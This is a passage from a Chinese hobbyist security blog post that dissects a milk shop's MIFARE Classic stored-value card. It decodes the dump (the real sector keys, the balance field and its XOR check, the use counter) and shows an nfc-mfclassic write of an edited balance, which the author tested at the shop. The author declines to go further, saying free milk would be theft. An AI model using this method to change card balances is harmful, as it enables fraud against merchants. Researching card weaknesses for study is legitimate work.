</span></span><span class="line"><span class="cl">Block 34, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 33, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 32, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 31, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 30, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 29, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 28, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 27, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 26, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 25, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 24, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 23, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 22, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 21, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 20, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 19, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 18, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 17, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 16, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 15, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 14, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 13, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 12, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 11, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 10, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 09, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 08, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 07, <span class="nb">type</span> A, key 9db8bbe5265d :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  <span class="m">88</span>  <span class="m">32</span>  <span class="m">06</span>  <span class="m">88</span>  <span class="m">32</span>  <span class="m">06</span>
</span></span><span class="line"><span class="cl">Block 06, <span class="nb">type</span> A, key 9db8bbe5265d :36  <span class="m">30</span>  <span class="m">35</span>  <span class="m">34</span>  <span class="m">38</span>  <span class="m">32</span>  <span class="m">35</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 05, <span class="nb">type</span> A, key 9db8bbe5265d :03  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="nb">fc</span>  ff  ff  ff  <span class="m">03</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">05</span>  fa  <span class="m">05</span>  fa
</span></span><span class="line"><span class="cl">Block 04, <span class="nb">type</span> A, key 9db8bbe5265d :dc  <span class="m">23</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">23</span>  dc  ff  ff  dc  <span class="m">23</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">04</span>  fb  <span class="m">04</span>  fb
</span></span><span class="line"><span class="cl">Block 03, <span class="nb">type</span> A, key 9db8bbe5265d :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  <span class="m">88</span>  <span class="m">32</span>  <span class="m">06</span>  <span class="m">88</span>  <span class="m">32</span>  <span class="m">06</span>
</span></span><span class="line"><span class="cl">Block 02, <span class="nb">type</span> A, key 9db8bbe5265d :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 01, <span class="nb">type</span> A, key 9db8bbe5265d :bd  fa  d2  b5  b9  ab  cb  be  <span class="m">49</span>  <span class="m">43</span>  bf  a8  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 00, <span class="nb">type</span> A, key 9db8bbe5265d :96  c2  d2  9d  1b  <span class="m">08</span>  <span class="m">04</span>  <span class="m">00</span>  <span class="m">62</span>  <span class="m">63</span>  <span class="m">64</span>  <span class="m">65</span>  <span class="m">66</span>  <span class="m">67</span>  <span class="m">68</span>  <span class="m">69</span>
</span></span></code></pre></div><h3 id="开始分析">开始分析</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">96c2 d29d 1b08 <span class="m">0400</span> <span class="m">6263</span> <span class="m">6465</span> <span class="m">6667</span> <span class="m">6869</span>     <span class="c1">#UID 96c2d29d(4 bytes), 1b(???), 08(SAK 1 byte), 0400(ATQA 0004 2 bytes), 6263646566676869(占位 bcdefghi 8 bytes)</span>
</span></span><span class="line"><span class="cl">bdfa d2b5 b9ab cbbe <span class="m">4943</span> bfa8 <span class="m">0000</span> <span class="m">0000</span>     <span class="c1">#字符串“晋业公司IC卡”</span>
</span></span><span class="line"><span class="cl"><span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>
</span></span><span class="line"><span class="cl">9db8 bbe5 265d ff07 <span class="m">8069</span> <span class="m">8832</span> <span class="m">0688</span> <span class="m">3206</span>     <span class="c1">#9db8bbe5265d(KeyA 6 bytes), ff0780(Access Conditions 3 bytes), 69（Undefined 1 byte）,883206883206(KeyB 6 bytes)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dc23 <span class="m">0000</span> 23dc ffff dc23 <span class="m">0000</span> 04fb 04fb     <span class="c1">#dc23 0000(金额高低位转换，10进制 91.80，4 bytes), 23dc ffff(金额异或校验位，4 bytes), 23dc ffff(金额，4 bytes), 04fb 04fb(???)</span>
</span></span><span class="line"><span class="cl"><span class="m">0300</span> <span class="m">0000</span> fcff ffff <span class="m">0300</span> <span class="m">0000</span> 05fa 05fa     <span class="c1">#0300 0000(使用次数，每次消费或充值加1，4 bytes), fcff ffff(次数异或校验位，4 bytes), 0300 0000(次数，4 bytes), 05fa(???)</span>
</span></span><span class="line"><span class="cl"><span class="m">3630</span> <span class="m">3534</span> <span class="m">3832</span> <span class="m">3500</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>     <span class="c1">#卡号6054825</span>
</span></span><span class="line"><span class="cl">9db8 bbe5 265d ff07 <span class="m">8069</span> <span class="m">8832</span> <span class="m">0688</span> <span class="m">3206</span>     <span class="c1">#9db8bbe5265d(KeyA 6 bytes), ff0780(Access Conditions 3 bytes), 69(Undefined 1 byte),883206883206(KeyB 6 bytes)</span>
</span></span></code></pre></div><h3 id="修改数据">修改数据</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gorgias@3vil ~&gt; nfc-mfclassic
</span></span><span class="line"><span class="cl">Usage: nfc-mfclassic f<span class="p">|</span>r<span class="p">|</span>R<span class="p">|</span>w<span class="p">|</span>W a<span class="p">|</span>b &lt;dump.mfd&gt; <span class="o">[</span>&lt;keys.mfd&gt; <span class="o">[</span>f<span class="o">]]</span>
</span></span><span class="line"><span class="cl">  f<span class="p">|</span>r<span class="p">|</span>R<span class="p">|</span>w<span class="p">|</span>W     - Perform format <span class="o">(</span>f<span class="o">)</span> or <span class="nb">read</span> from <span class="o">(</span>r<span class="o">)</span> or unlocked <span class="nb">read</span> from <span class="o">(</span>R<span class="o">)</span> or write to <span class="o">(</span>w<span class="o">)</span> or unlocked write to <span class="o">(</span>W<span class="o">)</span> card
</span></span><span class="line"><span class="cl">                  *** format will reset all keys to FFFFFFFFFFFF and all data to <span class="m">00</span> and all ACLs to default
</span></span><span class="line"><span class="cl">                  *** unlocked <span class="nb">read</span> does not require authentication and will reveal A and B keys
</span></span><span class="line"><span class="cl">                  *** note that unlocked write will attempt to overwrite block <span class="m">0</span> including UID
</span></span><span class="line"><span class="cl">                  *** unlocking only works with special Mifare 1K cards <span class="o">(</span>Chinese clones<span class="o">)</span>
</span></span><span class="line"><span class="cl">  a<span class="p">|</span>A<span class="p">|</span>b<span class="p">|</span>B       - Use A or B keys <span class="k">for</span> action<span class="p">;</span> Halt on errors <span class="o">(</span>a<span class="p">|</span>b<span class="o">)</span> or tolerate errors <span class="o">(</span>A<span class="p">|</span>B<span class="o">)</span>
</span></span><span class="line"><span class="cl">  &lt;dump.mfd&gt;    - MiFare Dump <span class="o">(</span>MFD<span class="o">)</span> used to write <span class="o">(</span>card to MFD<span class="o">)</span> or <span class="o">(</span>MFD to card<span class="o">)</span>
</span></span><span class="line"><span class="cl">  &lt;keys.mfd&gt;    - MiFare Dump <span class="o">(</span>MFD<span class="o">)</span> that contain the keys <span class="o">(</span>optional<span class="o">)</span>
</span></span><span class="line"><span class="cl">  f             - Force using the keyfile even <span class="k">if</span> UID does not match <span class="o">(</span>optional<span class="o">)</span>
</span></span><span class="line"><span class="cl">Examples:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Read card to file, using key A:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    nfc-mfclassic r a mycard.mfd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Write file to blank card, using key A:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    nfc-mfclassic w a mycard.mfd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Write new data and/or keys to previously written card, using key A:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    nfc-mfclassic w a newdata.mfd mycard.mfd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Format/wipe card <span class="o">(</span>note two passes required to ensure writes <span class="k">for</span> all ACL cases<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    nfc-mfclassic f A dummy.mfd keyfile.mfd f
</span></span><span class="line"><span class="cl">    nfc-mfclassic f B dummy.mfd keyfile.mfd f
</span></span></code></pre></div><p>使用大写参数W可以改写空白MC1K卡的UID(某宝上面卖的那种)。
<img loading="lazy"  src="./cover.jpg"
        alt="cover"/></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gorgias@3vil ~&gt; nfc-mfclassic w a ~/temp/test.mfd ~/temp/old.mfd
</span></span><span class="line"><span class="cl">NFC reader: ACS / ACR122U PICC Interface opened
</span></span><span class="line"><span class="cl">Found MIFARE Classic card:
</span></span><span class="line"><span class="cl">ISO/IEC 14443A <span class="o">(</span><span class="m">106</span> kbps<span class="o">)</span> target:
</span></span><span class="line"><span class="cl">    ATQA <span class="o">(</span>SENS_RES<span class="o">)</span>: <span class="m">00</span>  <span class="m">04</span>
</span></span><span class="line"><span class="cl">         UID <span class="o">(</span>NFCID1<span class="o">)</span>: <span class="m">96</span>  c2  d2  9d
</span></span><span class="line"><span class="cl">      SAK <span class="o">(</span>SEL_RES<span class="o">)</span>: <span class="m">08</span>
</span></span><span class="line"><span class="cl">Guessing size: seems to be a 1024-byte card
</span></span><span class="line"><span class="cl">Writing <span class="m">64</span> blocks <span class="p">|</span>...............................................................<span class="p">|</span>
</span></span><span class="line"><span class="cl">Done, <span class="m">63</span> of <span class="m">64</span> blocks written.
</span></span></code></pre></div><p>这里把金额修改减少一毛钱，把修改好的数据写进去，再去鲜奶店刷卡成功，小票上面的金额也匹配。
<img loading="lazy"  src="./compare.jpg"
        alt="compare"/>
结构很简单，完全可以“免费”喝奶。但是这和偷没什么区别了，奶店也是小本生意。</p>
<h2 id="reference">Reference</h2>
<p><a href="http://cache.nxp.com/documents/application_note/AN10833.pdf"target="_blank" rel="noopener noreferrer">[AN10833] MIFARE Type Identification Procedure</a></p>
<p><a href="http://cache.nxp.com/documents/application_note/AN10927.pdf"target="_blank" rel="noopener noreferrer">[AN10927] MIFARE and handling of UIDs</a></p>
<p><a href="http://www.nxp.com/documents/application_note/AN1304.pdf"target="_blank" rel="noopener noreferrer">[AN1304] NFC Type MIFARE Classic Tag Operation</a></p>
<p><a href="http://nickholdren.com/wp-content/uploads/2009/07/capstone.pdf"target="_blank" rel="noopener noreferrer">The Mifare Classic AuthenticationProcess</a></p>
<p><a href="https://www.cs.bham.ac.uk/~garciaf/publications/Dismantling.Mifare.pdf"target="_blank" rel="noopener noreferrer">Dismantling MIFARE Classic</a></p>
<p><a href="https://www.blackhat.com/docs/sp-14/materials/arsenal/sp-14-Almeida-Hacking-MIFARE-Classic-Cards-Slides.pdf"target="_blank" rel="noopener noreferrer">RFID Cooking with Mifare Classic</a></p>
<p><a href="http://www.cnblogs.com/k1two2/p/5415400.html"target="_blank" rel="noopener noreferrer">谈谈 Mifare Classic 破解 - K1two2</a></p>
<p><a href="http://www.freebuf.com/articles/wireless/8792.html"target="_blank" rel="noopener noreferrer">RFID破解三两事(三篇文章和评论)</a></p>
</article><section class="article labels"><a class="category" href=/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/>硬件安全</a><a class="tag" href=/tags/acr122u/>ACR122U</a><a class="tag" href=/tags/ic%E5%8D%A1/>IC卡</a><a class="tag" href=/tags/rfid/>RFID</a></section>
</div>
<div class="article bottom"><section class="article navigation"><p><a class="link" href="/posts/qemu%E5%88%9D%E4%BD%93%E9%AA%8C/"><span class="iconfont icon-article"></span>KVM/QEMU初体验</a></p><p><a class="link" href="/posts/%E4%BA%94%E5%A4%AA%E5%AD%90%E4%B8%8D%E8%83%BD%E9%80%80%E4%BC%91%E5%BF%AB%E5%BD%93%E6%88%91%E7%9A%84%E5%A4%87%E7%94%A8%E6%9C%BA/"><span class="iconfont icon-article"></span>五太子不能退休，快当我的备用机！</a></p></section></div></section><section id="footer"><div class="footer-wrap">
    <p class="copyright">2015 - 2025 Gorgias' Blog. </p>
    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>

</html>